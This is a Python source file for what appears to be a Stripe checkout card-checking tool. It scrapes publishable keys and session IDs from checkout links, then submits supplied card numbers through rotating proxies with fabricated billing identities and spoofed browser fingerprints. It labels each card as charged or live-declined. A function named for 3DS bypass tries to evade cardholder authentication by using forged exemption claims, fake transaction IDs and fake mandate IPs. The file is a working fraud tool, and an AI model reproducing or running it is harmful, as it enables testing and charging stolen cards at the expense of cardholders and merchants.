import httpx
import asyncio
import time
import random
import string
import json
import re
import os
import logging

logging.basicConfig(level=logging.INFO, format='%(name)s: %(message)s')
logger = logging.getLogger("stripe_co")
logger.setLevel(logging.INFO)

STRIPE_API = "https://api.stripe.com/v1"
PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
]


def _random_guid():
    return "".join(random.choices(string.hexdigits.lower(), k=32))


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    firsts = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies"]
    return random.choice(firsts), random.choice(lasts)


def _get_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


def parse_checkout_url(url):
    url = url.strip()
    sid = _extract_session_id(url)
    if sid:
        return sid
    if 'checkout.stripe.com' in url or 'pay/' in url or 'c/pay/' in url:
        return url
    return None


def _extract_session_id(text):
    all_sids = re.findall(r'(cs_(?:live|test)_[a-zA-Z0-9_\-\.]+[a-zA-Z0-9])', text)
    if all_sids:
        return max(all_sids, key=len)
    return None


def _extract_all_session_ids(text):
    return re.findall(r'(cs_(?:live|test)_[a-zA-Z0-9_\-\.]+[a-zA-Z0-9])', text)


def _decode_stripe_fragment(fragment):
    import base64
    import urllib.parse
    if not fragment:
        return None
    frag = fragment.lstrip('#')
    if not frag:
        return None

    try:
        url_decoded = urllib.parse.unquote(frag)
        padded = url_decoded + '=' * (4 - len(url_decoded) % 4) if len(url_decoded) % 4 else url_decoded
        raw = base64.b64decode(padded)
        decoded = ''.join(chr(b ^ 5) for b in raw).strip()
        logger.info(f"Fragment decoded ({len(decoded)} chars): {decoded[:120]}...")
        try:
            data = json.loads(decoded)
            return data
        except json.JSONDecodeError:
            logger.warning(f"Fragment decoded but not valid JSON: {decoded[:200]}")
            return {"_raw": decoded}
    except Exception as e:
        logger.warning(f"Fragment decode failed: {e}")
        return None


def _extract_amount_from_pp(pp_data):
    amount = None

    pi = pp_data.get("payment_intent")
    if isinstance(pi, dict):
        raw = pi.get("amount")
        if isinstance(raw, (int, float)) and raw is not True:
            amount = int(raw)

    si = pp_data.get("setup_intent")
    if isinstance(si, dict) and amount is None:
        amount = 0

    if amount is None:
        for key in ("amount_total", "amount_subtotal"):
            val = pp_data.get(key)
            if isinstance(val, (int, float)) and val is not True:
                amount = int(val)
                break

    if amount is None:
        recurring = pp_data.get("recurring_details")
        if isinstance(recurring, dict):
            for rkey in ("total", "subtotal"):
                val = recurring.get(rkey)
                if isinstance(val, (int, float)) and val is not True and val > 0:
                    amount = int(val)
                    logger.info(f"Got amount from recurring_details.{rkey}: {amount}")
                    break

    if amount is None:
        line_items = pp_data.get("line_items", [])
        if isinstance(line_items, list):
            total = 0
            found_any = False
            for item in line_items:
                if isinstance(item, dict):
                    for akey in ("amount_total", "amount", "amount_subtotal"):
                        val = item.get(akey)
                        if isinstance(val, (int, float)) and val is not True:
                            total += int(val)
                            found_any = True
                            break
            if found_any:
                amount = total
                logger.info(f"Got amount from line_items: {amount}")

    if amount is None:
        lig = pp_data.get("line_item_group")
        if isinstance(lig, dict):
            for lig_key in ("total", "subtotal", "amount"):
                val = lig.get(lig_key)
                if isinstance(val, (int, float)) and val is not True and val > 0:
                    amount = int(val)
                    logger.info(f"Got amount from line_item_group.{lig_key}: {amount}")
                    break
            if amount is None:
                lig_items = lig.get("line_items", [])
                if isinstance(lig_items, list):
                    lig_total = 0
                    lig_found = False
                    for item in lig_items:
                        if isinstance(item, dict):
                            for akey in ("amount_total", "amount", "amount_subtotal"):
                                val = item.get(akey)
                                if isinstance(val, (int, float)) and val is not True:
                                    lig_total += int(val)
                                    lig_found = True
                                    break
                    if lig_found:
                        amount = lig_total
                        logger.info(f"Got amount from line_item_group items: {amount}")

    if amount is None:
        ts = pp_data.get("total_summary")
        if isinstance(ts, dict):
            for ts_key in ("total", "subtotal", "amount"):
                val = ts.get(ts_key)
                if isinstance(val, (int, float)) and val is not True and val > 0:
                    amount = int(val)
                    logger.info(f"Got amount from total_summary.{ts_key}: {amount}")
                    break

    if amount is None:
        deep_amount = _deep_find(pp_data, "amount")
        if isinstance(deep_amount, (int, float)) and deep_amount is not True and deep_amount > 0:
            amount = int(deep_amount)
            logger.info(f"Got amount via deep search: {amount}")

    return amount


async def _fetch_checkout_info(client, checkout_url):
    fragment = ""
    if '#' in checkout_url:
        url_no_frag, fragment = checkout_url.split('#', 1)
    else:
        url_no_frag = checkout_url

    if url_no_frag.startswith('cs_'):
        full_url = f"https://checkout.stripe.com/c/pay/{url_no_frag}"
    else:
        full_url = url_no_frag

    logger.info(f"Fetching checkout: url={full_url[:120]}, has_fragment={bool(fragment)}, frag_len={len(fragment)}")

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
    }

    try:
        resp = await client.get(full_url, headers=headers, follow_redirects=True, timeout=20)
        html = resp.text
        final_url = str(resp.url)
        logger.info(f"Checkout page loaded: status={resp.status_code}, final_url={final_url[:120]}, html_len={len(html)}")
    except Exception as e:
        logger.error(f"Failed to load checkout: {e}")
        return None, f"Failed to load checkout: {str(e)[:60]}"

    all_candidates = set()

    url_sids = _extract_all_session_ids(checkout_url)
    all_candidates.update(url_sids)

    final_sids = _extract_all_session_ids(final_url)
    all_candidates.update(final_sids)

    html_sids = _extract_all_session_ids(html)
    all_candidates.update(html_sids)

    frag_data = None
    frag_pk = None
    if fragment:
        frag_data = _decode_stripe_fragment(fragment)
        if frag_data and isinstance(frag_data, dict):
            frag_pk = frag_data.get("apiKey")
            if frag_pk:
                logger.info(f"Got PK from fragment: {frag_pk[:30]}...")
            frag_raw = frag_data.get("_raw", "")
            if frag_raw:
                frag_sids = _extract_all_session_ids(frag_raw)
                all_candidates.update(frag_sids)

    session_id = max(all_candidates, key=len) if all_candidates else None

    logger.info(f"Session ID candidates ({len(all_candidates)}): {[f'{s[:25]}...({len(s)})' for s in all_candidates]}")
    logger.info(f"Selected session ID ({len(session_id) if session_id else 0} chars): {session_id[:50] if session_id else 'None'}")

    pk = frag_pk

    if not pk:
        pk_patterns = [
            r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'"apiKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'"key"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'(pk_(?:live|test)_[a-zA-Z0-9]{20,})',
        ]
        session_mode = "live" if session_id and "cs_live_" in session_id else "test"
        all_pks = set()
        for pat in pk_patterns:
            for m_pk in re.finditer(pat, html):
                found = m_pk.group(1) if m_pk.lastindex else m_pk.group(0)
                all_pks.add(found)

        matching = [p for p in all_pks if f"pk_{session_mode}_" in p]
        if matching:
            pk = max(matching, key=len)
            logger.info(f"Using {session_mode} PK from HTML: {pk[:30]}...")
        elif all_pks:
            pk = max(all_pks, key=len)
            logger.warning(f"No {session_mode} PK found, using fallback: {pk[:30]}...")

    if not pk:
        logger.error(f"No PK found anywhere")
        return None, "Could not find Stripe publishable key"

    if not session_id:
        logger.error("No session ID found anywhere")
        return None, "Could not find checkout session ID"

    amount = None
    currency = None
    merchant = None
    pp_data = {}

    try:
        pp_headers = {
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://checkout.stripe.com",
            "Referer": "https://checkout.stripe.com/",
            "Accept": "application/json",
        }
        pp_resp = await client.get(
            f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
            headers=pp_headers,
            timeout=15,
        )
        pp_data = pp_resp.json()
        logger.info(f"Payment page info: status={pp_resp.status_code}, keys={list(pp_data.keys())[:10]}")

        if "error" not in pp_data:
            amount = _extract_amount_from_pp(pp_data)

            pi = pp_data.get("payment_intent")
            if isinstance(pi, dict):
                currency = pi.get("currency", "").upper() if pi.get("currency") else None

            acct = pp_data.get("account_settings", {})
            merchant = acct.get("display_name") or acct.get("order_summary_display_name")
            if not currency:
                currency = pp_data.get("currency", "").upper() if pp_data.get("currency") else None
        else:
            logger.warning(f"Payment page info error: {pp_data['error']}")
    except Exception as e:
        logger.warning(f"Payment page info fetch failed: {e}")

    if amount is None:
        amount_patterns = [
            r'"amount"\s*:\s*(\d+)',
            r'"total"\s*:\s*(\d+)',
            r'"amount_total"\s*:\s*(\d+)',
            r'"unitAmount"\s*:\s*(\d+)',
        ]
        for pat in amount_patterns:
            m = re.search(pat, html)
            if m:
                try:
                    parsed = int(m.group(1))
                    if parsed > 0:
                        amount = parsed
                        logger.info(f"Got amount from HTML pattern '{pat}': {amount}")
                        break
                except (ValueError, IndexError):
                    pass

    stripe_js_version = None
    ver_match = re.search(r'STRIPE_JS_BUILD_SALT\s+([a-f0-9]{10,})\*/', html)
    if ver_match:
        stripe_js_version = ver_match.group(1)
        logger.info(f"Stripe.js version: {stripe_js_version}")

    billing_required = False
    customer_email = None
    if "error" not in pp_data:
        billing_required = pp_data.get("billing_address_collection") == "required"
        customer_email = pp_data.get("customer_email")

    logger.info(f"Checkout info: pk={pk[:20]}..., session={session_id[:40]}..., amount={amount}, currency={currency}, merchant={merchant}")

    return {
        "pk": pk,
        "session_id": session_id,
        "amount": amount,
        "currency": currency,
        "merchant": merchant,
        "stripe_js_version": stripe_js_version,
        "billing_required": billing_required,
        "customer_email": customer_email,
    }, None


def _deep_find(obj, key):
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            result = _deep_find(v, key)
            if result is not None:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = _deep_find(item, key)
            if result is not None:
                return result
    return None


async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=None):
    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy

    first, last = _random_name()
    email = _random_email()
    city, state, postal = random.choice(US_CITIES)
    street_num = random.randint(100, 9999)
    street = random.choice(US_STREETS)

    js_ver = stripe_js_version or "5e27053bf5"
    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    pm_data = {
        "type": "card",
        "card[number]": cc,
        "card[exp_month]": mm.zfill(2),
        "card[exp_year]": exp_year,
        "card[cvc]": cvv,
        "billing_details[name]": f"{first} {last}",
        "billing_details[email]": email,
        "billing_details[address][line1]": f"{street_num} {street}",
        "billing_details[address][city]": city,
        "billing_details[address][state]": state,
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": postal,
        "guid": _random_guid(),
        "muid": _random_guid(),
        "sid": _random_guid(),
        "payment_user_agent": pua,
        "time_on_page": str(random.randint(30000, 120000)),
        "key": pk,
    }

    try:
        resp = await client.post(
            f"{STRIPE_API}/payment_methods",
            data=pm_data,
            headers=headers,
            timeout=20,
        )
        data = resp.json()
    except Exception as e:
        logger.error(f"PM creation error: {e}")
        return None, f"PM request failed: {str(e)[:50]}", None

    if "error" in data:
        err = data["error"]
        code = err.get("code", "unknown")
        msg = err.get("message", "")
        logger.info(f"PM error: {code} - {msg}")
        return None, f"{code}: {msg[:80]}", None

    pm_id = data.get("id")
    if not pm_id:
        return None, "No PM ID returned", None

    card = data.get("card", {})
    brand = card.get("brand", "?").upper()
    last4 = card.get("last4", "????")
    funding = card.get("funding", "?").upper()
    country = card.get("country", "??")
    card_info = f"{brand} {funding} | {country} | {last4}"

    return pm_id, None, card_info


def _classify_confirm_error(error_data, intent_type="payment"):
    code = error_data.get("code", "")
    decline = error_data.get("decline_code", "")
    msg = error_data.get("message", "")

    if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
        return "live_declined", decline or code
    if code == "card_declined":
        return "declined", decline or "card_declined"
    if code == "expired_card":
        return "declined", "expired_card"
    if code == "processing_error":
        return "declined", "processing_error"
    return "declined", f"{code}: {msg[:60]}"


US_CITIES = [
    ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"),
    ("Houston", "TX", "77001"), ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
    ("San Antonio", "TX", "78201"), ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"),
    ("Miami", "FL", "33101"), ("Atlanta", "GA", "30301"), ("Boston", "MA", "02101"),
    ("Seattle", "WA", "98101"), ("Denver", "CO", "80201"), ("Portland", "OR", "97201"),
]

US_STREETS = [
    "Main St", "Oak Ave", "Elm St", "Park Blvd", "Cedar Ln", "Maple Dr",
    "Washington St", "Lake Ave", "Hill Rd", "Valley Way", "Pine St", "River Rd",
]


async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                                     cc=None, mm=None, yy=None, cvv=None,
                                     stripe_js_version=None, billing_required=False,
                                     customer_email=None):
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    first, last = _random_name()
    email = customer_email or _random_email()
    city, state, postal = random.choice(US_CITIES)
    street_num = random.randint(100, 9999)
    street = random.choice(US_STREETS)

    js_ver = stripe_js_version or "5e27053bf5"
    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"

    if cc and mm and yy and cvv:
        exp_year = f"20{yy}" if len(yy) == 2 else yy
        confirm_data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][exp_month]": mm.zfill(2),
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[billing_details][name]": f"{first} {last}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][line1]": f"{street_num} {street}",
            "payment_method_data[billing_details][address][city]": city,
            "payment_method_data[billing_details][address][state]": state,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": postal,
            "payment_method_data[guid]": _random_guid(),
            "payment_method_data[muid]": _random_guid(),
            "payment_method_data[sid]": _random_guid(),
            "payment_method_data[payment_user_agent]": pua,
            "payment_method_data[time_on_page]": str(random.randint(30000, 120000)),
            "expected_payment_method_type": "card",
            "key": pk,
        }
    else:
        confirm_data = {
            "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "key": pk,
        }

    if isinstance(amount, (int, float)) and amount is not True:
        confirm_data["expected_amount"] = str(int(amount))
    else:
        logger.info("Amount still unknown at confirm time, fetching from payment_pages...")
        try:
            pp_resp = await client.get(
                f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
                headers=headers,
                timeout=15,
            )
            pp_data = pp_resp.json()
            if "error" not in pp_data:
                recovered_amount = _extract_amount_from_pp(pp_data)
                if recovered_amount is not None:
                    confirm_data["expected_amount"] = str(recovered_amount)
                    logger.info(f"Recovered amount at confirm time: {recovered_amount}")
                else:
                    logger.warning("Could not recover amount at confirm time")
            else:
                logger.warning(f"Payment page error at confirm: {pp_data['error']}")
        except Exception as e:
            logger.warning(f"Amount fetch in confirm failed: {e}")

    async def _do_confirm(cd):
        try:
            r = await client.post(
                f"{STRIPE_API}/payment_pages/{session_id}/confirm",
                data=cd,
                headers=headers,
                timeout=30,
            )
            return r.json()
        except Exception as exc:
            logger.error(f"Payment page confirm error: {exc}")
            return None

    data = await _do_confirm(confirm_data)
    if data is None:
        return "error", "Confirm request failed"

    if "error" in data:
        err = data["error"]
        code = err.get("code", "")
        msg = err.get("message", "")
        if "amount_mismatch" in code or "amount_mismatch" in msg.lower() or "does not match" in msg.lower():
            logger.info("Amount mismatch detected, re-fetching correct amount...")
            try:
                pp_resp = await client.get(
                    f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
                    headers=headers,
                    timeout=15,
                )
                pp_data = pp_resp.json()
                if "error" not in pp_data:
                    correct_amount = _extract_amount_from_pp(pp_data)
                    if correct_amount is not None:
                        confirm_data["expected_amount"] = str(correct_amount)
                        logger.info(f"Retrying with corrected amount: {correct_amount}")
                        data = await _do_confirm(confirm_data)
                        if data is None:
                            return "error", "Retry confirm failed"
                    else:
                        del confirm_data["expected_amount"]
                        logger.info("Retrying without expected_amount")
                        data = await _do_confirm(confirm_data)
                        if data is None:
                            return "error", "Retry confirm failed"
                else:
                    del confirm_data["expected_amount"]
                    data = await _do_confirm(confirm_data)
                    if data is None:
                        return "error", "Retry confirm failed"
            except Exception as e:
                logger.warning(f"Amount mismatch retry failed: {e}")

    logger.info(f"Payment page confirm response: status={data.get('status', 'N/A')}, keys={list(data.keys())[:10]}")

    if "error" in data:
        err = data["error"]
        code = err.get("code", "")
        decline = err.get("decline_code", "")
        msg = err.get("message", "")

        if "expired" in msg.lower() or "completed" in msg.lower():
            return "error", "Checkout session expired/completed"

        if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
            return "live_declined", decline or code
        if code == "card_declined":
            return "declined", decline or "card_declined"

        return "declined", f"{code}: {msg[:60]}"

    status = data.get("status", "")
    payment_status = data.get("payment_status", "")

    if status in ("complete", "succeeded") or payment_status == "paid":
        return "charged", "Charged Successfully"

    pi = data.get("payment_intent")
    if isinstance(pi, dict):
        pi_status = pi.get("status", "")
        logger.info(f"Nested PI: status={pi_status}, amount={pi.get('amount')}")

        if pi_status == "succeeded":
            return "charged", "Charged Successfully"
        if pi_status == "requires_capture":
            return "charged", "Authorized (Capture Pending)"
        if pi_status == "processing":
            return "charged", "Processing (Likely Charged)"

        if pi_status == "requires_action":
            logger.info(f"PI requires 3DS, attempting bypass...")
            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version)
            if bypass_result:
                return bypass_result
            next_action = pi.get("next_action", {})
            action_type = next_action.get("type", "")
            return "3ds", "3DS Authentication Required"

        if pi_status == "requires_payment_method":
            last_error = pi.get("last_payment_error", {})
            if last_error:
                return _classify_confirm_error(last_error)
            return "declined", "Payment method failed"

    si = data.get("setup_intent")
    if isinstance(si, dict):
        si_status = si.get("status", "")
        logger.info(f"Nested SI: status={si_status}")

        if si_status == "succeeded":
            return "charged", "Setup Succeeded"
        if si_status == "requires_action":
            logger.info(f"SI requires 3DS, attempting bypass...")
            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version)
            if bypass_result:
                return bypass_result
            return "3ds", "3DS Authentication Required"
        if si_status == "requires_payment_method":
            last_error = si.get("last_setup_error", {})
            if last_error:
                return _classify_confirm_error(last_error)
            return "declined", "Setup failed"

    pi_cs = data.get("payment_intent_client_secret")
    if pi_cs:
        pi_result = await _check_intent_status(client, pk, pi_cs, pm_id, "payment_intent")
        if pi_result:
            return pi_result

    si_cs = data.get("setup_intent_client_secret")
    if si_cs:
        si_result = await _check_intent_status(client, pk, si_cs, pm_id, "setup_intent")
        if si_result:
            return si_result

    if status == "open":
        return "declined", "Payment failed (session open)"

    if status:
        return "declined", f"Status: {status}"

    return "declined", "Unknown response"


async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None):
    cs = intent_data.get("client_secret", "")
    intent_id = intent_data.get("id", "")
    pm = intent_data.get("payment_method")

    if isinstance(pm, dict):
        pm_id = pm.get("id", "")
    elif isinstance(pm, str):
        pm_id = pm
    else:
        pm_id = ""

    if not cs or not intent_id or not pm_id:
        logger.info(f"3DS bypass: missing data - cs={bool(cs)}, id={bool(intent_id)}, pm={bool(pm_id)}")
        return None

    js_ver = stripe_js_version or "5e27053bf5"
    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    if intent_type == "payment_intent":
        endpoint = f"{STRIPE_API}/payment_intents/{intent_id}/confirm"
    else:
        endpoint = f"{STRIPE_API}/setup_intents/{intent_id}/confirm"

    bypass_attempts = []

    bypass_attempts.append({
        "client_secret": cs,
        "payment_method": pm_id,
        "payment_method_options[card][request_three_d_secure]": "any",
        "payment_method_options[card][setup_future_usage]": "off_session",
        "error_on_requires_action": "true",
        "payment_user_agent": pua,
        "key": pk,
    })

    bypass_attempts.append({
        "client_secret": cs,
        "payment_method": pm_id,
        "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
        "payment_method_options[card][mit_exemption][network_transaction_id]": _random_guid()[:15],
        "error_on_requires_action": "true",
        "payment_user_agent": pua,
        "key": pk,
    })

    bypass_attempts.append({
        "client_secret": cs,
        "payment_method": pm_id,
        "mandate_data[customer_acceptance][type]": "online",
        "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "mandate_data[customer_acceptance][online][user_agent]": UA,
        "error_on_requires_action": "true",
        "payment_user_agent": pua,
        "key": pk,
    })

    for i, attempt_data in enumerate(bypass_attempts):
        try:
            logger.info(f"3DS bypass attempt {i+1}/{len(bypass_attempts)} for {intent_id[:20]}...")
            resp = await client.post(endpoint, data=attempt_data, headers=headers, timeout=20)
            data = resp.json()

            if "error" in data:
                err = data["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")
                logger.info(f"3DS bypass {i+1} error: {code}/{decline} - {msg[:80]}")

                if code == "card_declined" and decline:
                    if decline in LIVE_DECLINE_CODES:
                        return "live_declined", f"{decline} (3DS Bypassed)"
                    return "declined", f"{decline} (3DS Bypassed)"

                if code == "authentication_required":
                    continue

                if code == "card_declined":
                    return "declined", f"card_declined (3DS Bypassed)"

                if "expired" in msg.lower() or "completed" in msg.lower():
                    return "error", "Intent expired"

                if code in ("payment_intent_unexpected_state", "setup_intent_unexpected_state"):
                    break

                continue

            status = data.get("status", "")
            logger.info(f"3DS bypass {i+1} result: status={status}")

            if status == "succeeded":
                return "charged", "Charged (3DS Bypassed)"
            if status == "requires_capture":
                return "charged", "Authorized (3DS Bypassed)"
            if status == "processing":
                return "charged", "Processing (3DS Bypassed)"
            if status == "requires_payment_method":
                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                last_error = data.get(error_key, {})
                if last_error:
                    result_status, result_msg = _classify_confirm_error(last_error)
                    return result_status, f"{result_msg} (3DS Bypassed)"
                return "declined", "Payment method failed (3DS Bypassed)"

            if status == "requires_action":
                continue

        except Exception as e:
            logger.warning(f"3DS bypass {i+1} exception: {e}")
            continue

    return None


async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
    intent_id = client_secret.split("_secret_")[0]

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    if intent_type == "payment_intent":
        endpoint = f"{STRIPE_API}/payment_intents/{intent_id}"
    else:
        endpoint = f"{STRIPE_API}/setup_intents/{intent_id}"

    try:
        resp = await client.get(
            f"{endpoint}?client_secret={client_secret}&key={pk}",
            headers=headers,
            timeout=15,
        )
        data = resp.json()
    except Exception as e:
        return "error", f"Intent check failed: {str(e)[:40]}"

    status = data.get("status", "")

    if status == "succeeded":
        return "charged", "Charged Successfully"

    if status == "requires_capture":
        return "charged", "Authorized (Capture Pending)"

    if status == "requires_action":
        next_action = data.get("next_action", {})
        action_type = next_action.get("type", "")
        if action_type in ("use_stripe_sdk", "redirect_to_url"):
            return "3ds", "3DS Authentication Required"
        return "3ds", f"Action Required ({action_type})"

    if status == "requires_payment_method":
        error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
        last_error = data.get(error_key, {})
        if last_error:
            return _classify_confirm_error(last_error)
        return "declined", "Payment method failed"

    if status == "processing":
        return "charged", "Processing (Likely Charged)"

    return None


async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, proxy=None):
    start = time.time()

    client_kwargs = {
        "timeout": httpx.Timeout(30),
        "headers": {"User-Agent": UA},
        "follow_redirects": True,
    }
    if proxy:
        client_kwargs["proxy"] = proxy
    else:
        p = _get_proxy()
        if p:
            client_kwargs["proxy"] = p

    async with httpx.AsyncClient(**client_kwargs) as client:
        if session_cache and session_cache.get("pk") and session_cache.get("session_id"):
            info = session_cache
            err = None
        else:
            info, err = await _fetch_checkout_info(client, checkout_url)

        if err:
            elapsed = round(time.time() - start, 2)
            return "error", f"Error - {err}", None, elapsed, None

        pk = info["pk"]
        session_id = info["session_id"]

        amount = info.get("amount")
        if not isinstance(amount, (int, float)) or amount is True:
            logger.info(f"Amount missing (value={amount!r}), re-fetching payment page info...")
            try:
                pp_headers = {
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://checkout.stripe.com",
                    "Referer": "https://checkout.stripe.com/",
                    "Accept": "application/json",
                }
                pp_resp = await client.get(
                    f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
                    headers=pp_headers,
                    timeout=15,
                )
                pp_data = pp_resp.json()
                logger.info(f"Re-fetch pp keys: {list(pp_data.keys())[:15]}")
                if "error" not in pp_data:
                    amount = _extract_amount_from_pp(pp_data)
                    if isinstance(amount, (int, float)) and amount is not True:
                        info["amount"] = int(amount)
                        logger.info(f"Recovered amount from payment page: {amount}")
                    else:
                        logger.warning(f"Could not recover amount. mode={pp_data.get('mode')}")
            except Exception as e:
                logger.warning(f"Amount re-fetch failed: {e}")

        status, msg = await _confirm_via_payment_pages(
            client, pk, session_id, None,
            amount=info.get("amount"),
            cc=cc, mm=mm, yy=yy, cvv=cvv,
            stripe_js_version=info.get("stripe_js_version"),
            billing_required=info.get("billing_required", False),
            customer_email=info.get("customer_email"),
        )

        elapsed = round(time.time() - start, 2)
        return status, msg, None, elapsed, info
